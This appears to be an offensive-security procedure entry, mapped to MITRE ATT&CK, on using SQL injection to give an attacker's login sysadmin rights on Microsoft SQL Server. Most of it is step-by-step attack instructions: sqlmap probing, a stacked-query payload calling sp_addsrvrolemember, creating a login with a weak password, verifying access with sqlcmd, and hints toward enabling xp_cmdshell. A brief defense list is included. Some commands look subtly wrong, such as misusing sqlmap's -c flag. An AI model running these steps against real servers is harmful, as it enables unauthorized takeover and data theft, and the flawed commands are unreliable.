---
id: c9a09377-486b-4233-b6a1-cfc11b585671
name: MSSQL-Injection-to-Grant-DBA-Access
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:34.077366+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Initial Access|TA0001 - Initial Access]]'
  - '[[tactics/Execution|TA0002 - Execution]]'
  - '[[tactics/Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
  - >-
    [[techniques/Exploitation of Remote Services|T1210 - Exploitation of Remote
    Services]]
sub_techniques: []
tags:
  - '[[tags/MSSQL-Injection]]'
  - '[[tags/Grant-DBA-Access]]'
commands:
  - '[[commands/mssql-add-user-to-sysadmin-role]]'
platforms:
  - Windows
tools: []
validated: true
---

# MSSQL-Injection-to-Grant-DBA-Access

## Summary

This procedure exploits a SQL injection vulnerability in a Microsoft SQL Server (MSSQL) instance to execute a malicious SQL command that adds a specified user login to the sysadmin server role, granting full Database Administrator (DBA) privileges. This allows the attacker to perform any database operation, including data exfiltration, modification, or further system compromise.

## Description

SQL injection in MSSQL occurs when user input is not properly sanitized, allowing attackers to append or modify SQL queries. In this scenario, the attacker identifies an injectable parameter in a web application or direct database interface connected to an MSSQL server. By injecting a payload that executes the sp_addsrvrolemember stored procedure, the attacker elevates a controlled login to sysadmin role, which provides unrestricted access to the database server. This technique is commonly used in web applications with vulnerable login forms, search fields, or API endpoints. The target environment is typically a Windows-based server running MSSQL (e.g., SQL Server 2016+). Success enables persistence, lateral movement, and data access, but requires an initial injection point and knowledge of an existing or creatable login.

## Requirements

1. Network access to a vulnerable MSSQL instance (typically port 1433/TCP exposed or via a web app proxy).
2. Identification of an SQL injection vulnerability (e.g., via error-based, union-based, or blind injection techniques).
3. A target login name that exists or can be created (e.g., via prior injection to create a login if needed).
4. Tools for crafting and delivering the injection payload, such as [[tools/sqlmap]] or manual tools like Burp Suite.
5. Basic knowledge of MSSQL syntax and stored procedures.

## Defense

- Apply input validation and parameterized queries in all application code interacting with MSSQL to prevent injection.
- Use least privilege principles: Run database applications with minimal permissions and avoid direct sysadmin access.
- Enable SQL Server auditing for role changes and failed logins; monitor for anomalous sp_addsrvrolemember executions.
- Deploy web application firewalls (WAFs) tuned to detect SQL injection patterns.
- Regularly patch MSSQL and review server roles via queries like SELECT * FROM sys.server_role_members.

## Objectives

1. Exploit SQL injection to execute arbitrary SQL commands on the MSSQL server.
2. Add a controlled user to the sysadmin role for full DBA access.
3. Verify and utilize the new privileges for further actions like querying sensitive data or executing OS commands.

## Instructions

### Step 1: Identify and Confirm SQL Injection Vulnerability

**Context**: Locate an injectable endpoint, such as a login form or search parameter in a web application backed by MSSQL. Confirm the vulnerability by appending a single quote (') and observing errors or behavior changes indicating SQL parsing.

Use a tool like [[tools/sqlmap]] to automate detection:

**Command** ([[commands/sqlmap-test-mssql-injection]]):
```bash
sqlmap -u "http://target.com/login.php" --dbms=mssql --level=3 --risk=2
```

> This tests for MSSQL-specific injection points. Look for database errors like "Unclosed quotation mark" to confirm vulnerability.

### Step 2: Craft and Deliver the Injection Payload

**Context**: Once confirmed, craft a payload to execute the sysadmin role addition. Union-based or stacked queries work best for MSSQL. Assume a vulnerable query like SELECT * FROM users WHERE id = '$input'. Inject to append: '; EXEC master.dbo.sp_addsrvrolemember 'attacker_user', 'sysadmin'; --

Deliver via manual request or sqlmap:

**Command** ([[commands/sqlmap-execute-mssql-payload]]):
```bash
sqlmap -u "http://target.com/vuln.php?id=1" --dbms=mssql -c "EXEC master.dbo.sp_addsrvrolemember 'attacker_user', 'sysadmin';" --batch
```

> This executes the custom SQL. If the login 'attacker_user' doesn't exist, first inject to create it: CREATE LOGIN attacker_user WITH PASSWORD='weakpass';

### Step 3: Execute the Role Addition Using the Payload

**Context**: Inject the core SQL code to add the user to sysadmin. This stored procedure modifies server-level roles, granting DBA powers.

**Code** ([[codes/mssql-sp-addsrvrolemember-grant-sysadmin]]):
```sql
EXEC master.dbo.sp_addsrvrolemember 'attacker_user', 'sysadmin';
```

Integrate into the full injection payload as in Step 2. The semicolon ends the injected statement, and comments (--) neutralize trailing query parts.

### Step 4: Verify DBA Access

**Context**: Connect to the MSSQL instance using the new credentials to confirm elevated privileges. Use sqlcmd or a GUI like SSMS.

**Command** ([[commands/sqlcmd-connect-with-new-user]]):
```bash
sqlcmd -S target_ip -U attacker_user -P weakpass -Q "SELECT IS_SRVROLEMEMBER('sysadmin')"
```

> Expected result: 1 (indicating membership). If successful, query roles: SELECT * FROM sys.server_role_members WHERE role_principal_id = 1;

**Expected Output** (for role addition): A success message like "The server principal 'attacker_user' has been added as a member of the 'sysadmin' server role." No output if injected silently; check via verification query.

**Success Indicators**:
- No SQL errors during injection; application behaves normally.
- New user can connect and execute sysadmin-only commands (e.g., xp_cmdshell enable).
- Audit logs show role membership change (if enabled).
